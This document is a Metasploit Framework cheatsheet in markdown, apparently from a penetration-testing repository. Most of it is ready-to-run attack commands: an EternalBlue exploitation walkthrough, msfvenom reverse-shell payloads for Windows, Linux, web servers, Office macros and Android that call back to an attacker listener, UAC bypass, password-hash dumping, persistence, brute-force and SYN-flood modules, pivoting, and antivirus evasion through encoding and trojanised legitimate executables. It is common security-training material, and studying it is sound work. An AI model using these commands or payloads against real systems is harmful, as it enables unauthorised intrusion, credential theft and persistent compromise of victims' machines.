# 🔴 Metasploit Framework - Complete Cheatsheet

```
                                   ___          ____
                               ,-""   `.      < HACK >
                             ,'  _   e )`-._ /  ----
                            /  ,' `-._<.===-'
                           /  /
                          /  ;
              _.--.__    /   ;
 (`._    _.-""       "--'    |
 <_  `-""                     \
  <`-                          :
   (__   <__.                  ;
     `-.   '-.__.      _.'    /
        \      `-.__,-'    _,'
         `._    ,    /__,-'
            ""._\__,'< <____
                 | |  `----.`.
                 | |        \ `.
                 ; |___      \-``
                 \   --<
                  `.`.<
                    `-'
```

![Metasploit](https://img.shields.io/badge/Metasploit-Framework-blue?style=for-the-badge&logo=metasploit)
![Kali Linux](https://img.shields.io/badge/Kali-Linux-557C94?style=for-the-badge&logo=kalilinux&logoColor=white)
![Offensive Security](https://img.shields.io/badge/Offensive-Security-red?style=for-the-badge)
![License](https://img.shields.io/badge/License-BSD--3-green?style=for-the-badge)

> **The world's most used penetration testing framework** - Your complete guide to mastering Metasploit

---

## 📋 Table of Contents

- [Introduction](#-introduction)
- [Installation](#-installation)
- [Architecture Overview](#-architecture-overview)
- [Starting Metasploit](#-starting-metasploit)
- [Basic Commands](#-basic-commands)
- [Module Types](#-module-types)
- [Exploitation Workflow](#-exploitation-workflow)
- [Database Integration](#-database-integration)
- [Scanning & Enumeration](#-scanning--enumeration)
- [Payload Generation (msfvenom)](#-payload-generation-msfvenom)
- [Post-Exploitation](#-post-exploitation)
- [Auxiliary Modules](#-auxiliary-modules)
- [Real-World Examples](#-real-world-examples)
- [Quick Reference Tables](#-quick-reference-tables)
- [Tips & Best Practices](#-tips--best-practices)
- [Resources](#-resources)

---

## 🎯 Introduction

**Metasploit Framework** is an open-source penetration testing and exploit development platform. It provides:

- 🔍 **Information gathering** and vulnerability scanning
- 💉 **Exploit development** and delivery
- 🎭 **Payload generation** for various platforms
- 🔐 **Post-exploitation** tools and techniques
- 📊 **Reporting** and documentation capabilities

### Key Components

| Component | Description |
|-----------|-------------|
| `msfconsole` | Main command-line interface |
| `msfvenom` | Payload generator and encoder |
| `msfdb` | Database management utility |
| `msfrpcd` | RPC daemon for remote access |

---

## 📥 Installation

### Kali Linux (Pre-installed)
```bash
# Update Metasploit
sudo apt update && sudo apt install metasploit-framework
```

### Ubuntu/Debian
```bash
# Install dependencies
sudo apt install curl gnupg2 software-properties-common

# Add Metasploit repository
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall
```

### Docker
```bash
docker pull metasploitframework/metasploit-framework
docker run --rm -it metasploitframework/metasploit-framework ./msfconsole
```

### Windows (Not Recommended for Production)
```powershell
# Download installer from: https://windows.metasploit.com/
# Run the installer and follow instructions
```

---

## 🏗️ Architecture Overview

```
┌─────────────────────────────────────────────────────────────┐
│                    METASPLOIT FRAMEWORK                      │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐    │
│  │ EXPLOITS │  │ PAYLOADS │  │AUXILIARY │  │   POST   │    │
│  │  (~2000) │  │  (~500)  │  │  (~1000) │  │  (~400)  │    │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘    │
│                                                              │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐    │
│  │ ENCODERS │  │   NOPS   │  │ EVASION  │  │ PLUGINS  │    │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘    │
│                                                              │
├─────────────────────────────────────────────────────────────┤
│                      INTERFACES                              │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐    │
│  │msfconsole│  │ Armitage │  │   API    │  │   RPC    │    │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘    │
├─────────────────────────────────────────────────────────────┤
│                 DATABASE (PostgreSQL)                        │
└─────────────────────────────────────────────────────────────┘
```

### Directory Structure
```
/usr/share/metasploit-framework/
├── modules/
│   ├── exploits/      # Exploitation modules
│   ├── payloads/      # Payload modules
│   ├── auxiliary/     # Scanning, fuzzing, etc.
│   ├── post/          # Post-exploitation
│   ├── encoders/      # Payload encoders
│   ├── nops/          # NOP generators
│   └── evasion/       # AV evasion modules
├── tools/             # Additional tools
├── scripts/           # Meterpreter scripts
├── data/              # Wordlists, templates
└── plugins/           # Console plugins
```

---

## 🚀 Starting Metasploit

### Initialize Database (First Time)
```bash
# Start PostgreSQL service
sudo systemctl start postgresql

# Initialize the database
sudo msfdb init

# Check database status
sudo msfdb status
```

### Launch msfconsole
```bash
# Standard launch
msfconsole

# Quiet mode (no banner)
msfconsole -q

# Execute commands on startup
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.100"

# Load resource file
msfconsole -r commands.rc
```

---

## ⌨️ Basic Commands

### Navigation & Help

| Command | Description |
|---------|-------------|
| `help` or `?` | Display help menu |
| `help <command>` | Help for specific command |
| `search <term>` | Search modules by name/CVE/platform |
| `use <module>` | Select a module |
| `back` | Exit current module |
| `info` | Display module information |
| `show options` | Show module options |
| `show advanced` | Show advanced options |
| `show payloads` | List compatible payloads |
| `show targets` | List available targets |

### Module Configuration

```bash
# Set options
set RHOSTS 192.168.1.100          # Target IP
set RPORT 445                      # Target port
set LHOST 192.168.1.50            # Local IP (attacker)
set LPORT 4444                     # Local port (listener)
set PAYLOAD windows/meterpreter/reverse_tcp

# Set globally (persists across modules)
setg RHOSTS 192.168.1.100
setg LHOST 192.168.1.50

# Unset options
unset RHOSTS
unsetg LHOST

# Check current settings
show options
check                              # Verify if target is vulnerable
```

### Execution

```bash
# Run the exploit
exploit
run

# Run in background
exploit -j

# Run with specific options
exploit -z                         # Don't interact with session after success
```

### Session Management

```bash
# List sessions
sessions
sessions -l

# Interact with session
sessions -i 1

# Kill session
sessions -k 1

# Kill all sessions
sessions -K

# Upgrade shell to Meterpreter
sessions -u 1

# Run command on all sessions
sessions -c "sysinfo"
```

---

## 📦 Module Types

### 1. Exploits
Modules that take advantage of vulnerabilities.

```bash
# Search exploits
search type:exploit platform:windows

# Example
use exploit/windows/smb/ms17_010_eternalblue
```

### 2. Payloads
Code executed after successful exploitation.

**Types:**
- **Singles** - Self-contained payloads
- **Stagers** - Set up connection between attacker and target
- **Stages** - Downloaded by stagers (Meterpreter)

```bash
# List payloads
show payloads

# Payload naming convention
<platform>/<arch>/<type>/<connection>
# Example: windows/x64/meterpreter/reverse_tcp
```

### 3. Auxiliary
Scanning, fuzzing, sniffing, and more.

```bash
search type:auxiliary
use auxiliary/scanner/portscan/tcp
```

### 4. Post
Post-exploitation modules.

```bash
search type:post platform:windows
use post/windows/gather/hashdump
```

### 5. Encoders
Encode payloads to evade detection.

```bash
show encoders
# Example: x86/shikata_ga_nai
```

---

## 🎯 Exploitation Workflow

```
┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│   RECON &    │───▶│    SELECT    │───▶│  CONFIGURE   │
│  ENUMERATION │    │    MODULE    │    │   OPTIONS    │
└──────────────┘    └──────────────┘    └──────────────┘
                                               │
                                               ▼
┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│    POST-     │◀───│   EXPLOIT    │◀───│    CHECK     │
│ EXPLOITATION │    │    TARGET    │    │    TARGET    │
└──────────────┘    └──────────────┘    └──────────────┘
```

### Step-by-Step Example

```bash
# 1. Search for exploit
msf6 > search eternalblue

# 2. Select module
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# 3. View options
msf6 exploit(ms17_010_eternalblue) > show options

# 4. Set target
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# 5. Set payload
msf6 exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# 6. Set listener
msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.50
msf6 exploit(ms17_010_eternalblue) > set LPORT 4444

# 7. Verify vulnerability (optional)
msf6 exploit(ms17_010_eternalblue) > check

# 8. Execute
msf6 exploit(ms17_010_eternalblue) > exploit
```

---

## 🗄️ Database Integration

### Setup & Connection

```bash
# Initialize database
msfdb init

# Connect to database
db_connect msf:password@127.0.0.1/msf

# Check status
db_status

# Disconnect
db_disconnect
```

### Workspace Management

```bash
# List workspaces
workspace

# Create workspace
workspace -a pentest_project

# Switch workspace
workspace pentest_project

# Delete workspace
workspace -d old_project

# Rename workspace
workspace -r old_name new_name
```

### Host Management

```bash
# List hosts
hosts

# Add host manually
hosts -a 192.168.1.100

# Delete host
hosts -d 192.168.1.100

# Search hosts
hosts -S windows

# Export hosts
hosts -o /tmp/hosts.csv
```

### Service Management

```bash
# List services
services

# Filter by port
services -p 80,443

# Filter by service name
services -s http

# Search services
services -S microsoft
```

### Vulnerability Management

```bash
# List vulnerabilities
vulns

# Add vulnerability
vulns -a 192.168.1.100 -n "MS17-010"
```

### Import/Export

```bash
# Import Nmap scan
db_import /path/to/nmap_scan.xml

# Import Nessus scan
db_import /path/to/nessus_scan.nessus

# Run Nmap directly
db_nmap -sV -O 192.168.1.0/24

# Export data
hosts -o hosts.csv
services -o services.csv
```

---

## 🔍 Scanning & Enumeration

### Port Scanning

```bash
# TCP SYN scan
use auxiliary/scanner/portscan/syn
set RHOSTS 192.168.1.0/24
set PORTS 1-1000
run

# TCP connect scan
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.100
set PORTS 1-65535
set THREADS 50
run
```

### Service Enumeration

```bash
# SMB enumeration
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

# SMB shares
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS 192.168.1.100
run

# SSH version
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.0/24
run

# HTTP version
use auxiliary/scanner/http/http_version
set RHOSTS 192.168.1.0/24
run

# FTP enumeration
use auxiliary/scanner/ftp/ftp_version
set RHOSTS 192.168.1.0/24
run
```

### Vulnerability Scanning

```bash
# SMB MS17-010 (EternalBlue)
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.0/24
run

# HTTP vulnerability scanner
use auxiliary/scanner/http/http_vuln_cve_2021_26855
set RHOSTS 192.168.1.100
run
```

---

## 💉 Payload Generation (msfvenom)

### Basic Syntax
```bash
msfvenom -p <PAYLOAD> <OPTIONS> -f <FORMAT> -o <OUTPUT>
```

### Common Options

| Option | Description |
|--------|-------------|
| `-p` | Payload to use |
| `-f` | Output format |
| `-o` | Output file |
| `-e` | Encoder to use |
| `-i` | Encoding iterations |
| `-b` | Bad characters to avoid |
| `-n` | NOP sled size |
| `--platform` | Target platform |
| `-a` | Architecture |
| `LHOST` | Listener IP |
| `LPORT` | Listener port |

### Windows Payloads

```bash
# Reverse TCP (Meterpreter)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe

# Reverse TCP (x64)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell64.exe

# Reverse HTTPS (Encrypted)
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.50 LPORT=443 -f exe -o shell_https.exe

# Bind TCP
msfvenom -p windows/meterpreter/bind_tcp LPORT=4444 -f exe -o bind_shell.exe

# With encoding (AV evasion)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded_shell.exe
```

### Linux Payloads

```bash
# Reverse TCP
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell

# Reverse TCP (x64)
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell64

# Bind shell
msfvenom -p linux/x86/shell/bind_tcp LPORT=4444 -f elf -o bind_shell
```

### Web Payloads

```bash
# PHP reverse shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.php

# ASP reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f asp -o shell.asp

# ASPX reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f aspx -o shell.aspx

# JSP reverse shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.jsp

# WAR file
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f war -o shell.war
```

### Scripting Payloads

```bash
# Python
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.py

# PowerShell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f psh -o shell.ps1

# VBA (Macro)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f vba -o shell.vba

# HTA
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f hta-psh -o shell.hta
```

### Android Payloads

```bash
# Android reverse TCP
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o app.apk
```

### macOS Payloads

```bash
# macOS reverse TCP
msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f macho -o shell
```

### Multi/Handler Setup

```bash
# Start listener
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit -j
```

---

## 🔓 Post-Exploitation

### Basic Post Modules

```bash
# Get system info
use post/windows/gather/enum_system

# Get logged in users
use post/windows/gather/enum_logged_on_users

# Dump password hashes
use post/windows/gather/hashdump

# Credentials from memory
use post/windows/gather/credentials/credential_collector

# Check VM
use post/windows/gather/checkvm
```

### Privilege Escalation

```bash
# Windows escalation suggester
use post/multi/recon/local_exploit_suggester
set SESSION 1
run

# UAC bypass
use exploit/windows/local/bypassuac_eventvwr
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
exploit

# Get SYSTEM
use post/windows/escalate/getsystem
```

### Persistence

```bash
# Registry persistence
use exploit/windows/local/persistence_service
set SESSION 1
run

# Scheduled task persistence
use post/windows/manage/persistence_exe
set SESSION 1
set STARTUP SYSTEM
run
```

---

## 🔧 Auxiliary Modules

### Brute Force

```bash
# SSH brute force
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.100
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
set THREADS 10
run

# SMB brute force
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.1.100
set SMBUser administrator
set PASS_FILE /usr/share/wordlists/rockyou.txt
run

# FTP brute force
use auxiliary/scanner/ftp/ftp_login
set RHOSTS 192.168.1.100
set USERNAME anonymous
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

### Sniffing

```bash
# HTTP password sniffer
use auxiliary/sniffer/psnuffle
run

# Capture packets
use auxiliary/sniffer/capture
set INTERFACE eth0
run
```

### DoS (Testing Only)

```bash
# SYN flood
use auxiliary/dos/tcp/synflood
set RHOSTS 192.168.1.100
set RPORT 80
run
```

---

## 🎬 Real-World Examples

### Example 1: EternalBlue Attack (MS17-010)

```bash
# Start Metasploit
msfconsole -q

# Search for exploit
search eternalblue

# Use the exploit
use exploit/windows/smb/ms17_010_eternalblue

# Configure
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444

# Check if vulnerable
check

# Exploit
exploit
```

### Example 2: Web Application Attack

```bash
# Scan for vulnerabilities
use auxiliary/scanner/http/dir_scanner
set RHOSTS 192.168.1.100
set DICTIONARY /usr/share/wordlists/dirb/common.txt
run

# Exploit file upload
use exploit/multi/http/php_file_upload
set RHOSTS 192.168.1.100
set TARGETURI /uploads/
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 192.168.1.50
exploit
```

### Example 3: Multi-Handler with msfvenom

```bash
# Terminal 1: Generate payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload.exe

# Terminal 2: Start handler
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit -j

# Transfer payload.exe to target and execute
# Session will connect to handler
```

### Example 4: Pivoting Through Compromised Host

```bash
# After getting Meterpreter session
meterpreter > run autoroute -s 10.10.10.0/24

# Or from msfconsole
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 10.10.10.0
run

# Now scan internal network
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.0/24
set PORTS 22,80,445
run
```

---

## 📊 Quick Reference Tables

### Essential Commands

| Command | Description |
|---------|-------------|
| `search <term>` | Search for modules |
| `use <module>` | Select module |
| `show options` | Display options |
| `set <opt> <val>` | Set option value |
| `exploit` / `run` | Execute module |
| `back` | Return to main |
| `sessions -l` | List sessions |
| `sessions -i <id>` | Interact with session |

### Common Payloads

| Payload | Description |
|---------|-------------|
| `windows/meterpreter/reverse_tcp` | Windows Meterpreter (32-bit) |
| `windows/x64/meterpreter/reverse_tcp` | Windows Meterpreter (64-bit) |
| `windows/meterpreter/reverse_https` | Encrypted connection |
| `linux/x86/meterpreter/reverse_tcp` | Linux Meterpreter |
| `php/meterpreter/reverse_tcp` | PHP Meterpreter |
| `java/jsp_shell_reverse_tcp` | Java/JSP shell |
| `android/meterpreter/reverse_tcp` | Android Meterpreter |

### Output Formats (msfvenom)

| Format | Extension | Use Case |
|--------|-----------|----------|
| `exe` | .exe | Windows executable |
| `elf` | (none) | Linux executable |
| `macho` | (none) | macOS executable |
| `raw` | varies | Raw shellcode |
| `asp` | .asp | IIS web server |
| `aspx` | .aspx | .NET web server |
| `php` | .php | PHP web server |
| `jsp` | .jsp | Java web server |
| `war` | .war | Tomcat deployment |
| `psh` | .ps1 | PowerShell script |
| `vba` | .vba | Office macro |
| `dll` | .dll | Windows library |

### Popular Encoders

| Encoder | Description |
|---------|-------------|
| `x86/shikata_ga_nai` | Polymorphic XOR encoder |
| `x64/xor` | XOR encoder (64-bit) |
| `x86/alpha_mixed` | Alphanumeric encoder |
| `php/base64` | Base64 PHP encoder |

---

## 💡 Tips & Best Practices

### ⚠️ Legal Disclaimer
> **IMPORTANT:** Only use Metasploit against systems you own or have explicit written permission to test. Unauthorized access to computer systems is illegal.

### Performance Tips

1. **Use Database**
   ```bash
   # Always initialize and use database
   msfdb init
   db_status
   ```

2. **Use Workspaces**
   ```bash
   workspace -a client_pentest
   ```

3. **Resource Scripts**
   ```bash
   # Save commands to .rc file
   echo "use exploit/multi/handler
   set PAYLOAD windows/meterpreter/reverse_tcp
   set LHOST 192.168.1.50
   set LPORT 4444
   exploit -j" > handler.rc
   
   # Run script
   msfconsole -r handler.rc
   ```

4. **Use Threads Wisely**
   ```bash
   set THREADS 10  # Don't overwhelm the target
   ```

### Evasion Techniques

1. **Multiple Encodings**
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe
   ```

2. **Custom Templates**
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -x /path/to/legitimate.exe -f exe
   ```

3. **Use HTTPS Payloads**
   ```bash
   set PAYLOAD windows/meterpreter/reverse_https
   ```

### Troubleshooting

| Issue | Solution |
|-------|----------|
| Database not connecting | `msfdb reinit` |
| Module not loading | `reload_all` |
| Session dies immediately | Check AV, use encoded payload |
| Exploit fails | Check target OS version, try different target |

---

## 📚 Resources

### Official Documentation
- [Metasploit Docs](https://docs.metasploit.com/)
- [Rapid7 Blog](https://www.rapid7.com/blog/)
- [Metasploit GitHub](https://github.com/rapid7/metasploit-framework)

### Learning Resources
- [Offensive Security](https://www.offensive-security.com/)
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)

### Cheatsheets
- [SANS Metasploit Cheatsheet](https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf)
- [Meterpreter Cheatsheet](./Meterpreter.md)

---

## 📄 License

This cheatsheet is provided for educational purposes only. Use responsibly and ethically.

---

<p align="center">
  <b>Happy Hacking! 🔴</b><br>
  <i>Remember: With great power comes great responsibility</i>
</p>
